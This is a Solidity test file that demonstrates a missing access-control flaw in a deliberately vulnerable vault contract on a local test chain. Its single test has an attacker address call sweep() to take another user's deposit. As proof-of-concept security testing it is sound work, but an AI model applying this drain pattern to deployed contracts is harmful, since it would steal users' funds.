// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {VulnerableVault} from "../src/VulnerableVault.sol";
import {TestUSDC} from "../src/TestUSDC.sol";

interface Vm {
    function chainId(uint256) external;
    function prank(address) external;
}

/// @notice Proves VulnerableVault.sweep() has no access control: any caller can
/// drain funds deposited by other users, not just their own deposit.
contract VulnerableVaultTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    TestUSDC private token;
    VulnerableVault private vault;
    address private victim = address(0xBEEF);
    address private attacker = address(0xA77ACC);

    function setUp() public {
        vm.chainId(31337);
        token = new TestUSDC();
        vault = new VulnerableVault(address(token));
        token.transfer(victim, 1_000_000 * 1e6);
        vm.prank(victim);
        token.approve(address(vault), 1_000_000 * 1e6);
        vm.prank(victim);
        vault.deposit(1_000_000 * 1e6);
    }

    function test_AnyCallerCanSweepOtherUsersDeposits() public {
        require(token.balanceOf(address(vault)) == 1_000_000 * 1e6, "vault should hold the deposit");
        require(token.balanceOf(attacker) == 0, "attacker should start empty");
        vm.prank(attacker);
        vault.sweep(attacker, 1_000_000 * 1e6);
        require(token.balanceOf(attacker) == 1_000_000 * 1e6, "attacker should have drained the vault");
        require(token.balanceOf(address(vault)) == 0, "vault should be empty");
    }
}
